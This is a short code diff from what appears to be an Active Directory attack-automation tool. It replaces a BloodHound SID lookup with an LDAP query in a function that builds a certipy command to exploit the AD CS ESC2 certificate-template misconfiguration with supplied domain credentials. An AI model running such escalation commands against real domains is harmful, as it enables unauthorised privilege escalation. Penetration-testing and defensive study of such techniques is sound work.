@@ -149,7 +149,7 @@ def certipy_ESC2(args, selected_template, selected_admin, target):
     ca_name = selected_template[2]
     admin_account, sid = selected_admin.split(":")
     admin_account2, garbage = admin_account.split("@")
-    userSID = ad_bloodhound.get_user_sid("ActiveDirectory/Bloodhound",args.domain_user)
+    userSID = ldap_queries.get_user_sid(args, args.domain_user)
     
     #Request user cert
     esc2_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template {template_name} -ca {ca_name} -sid {userSID}"
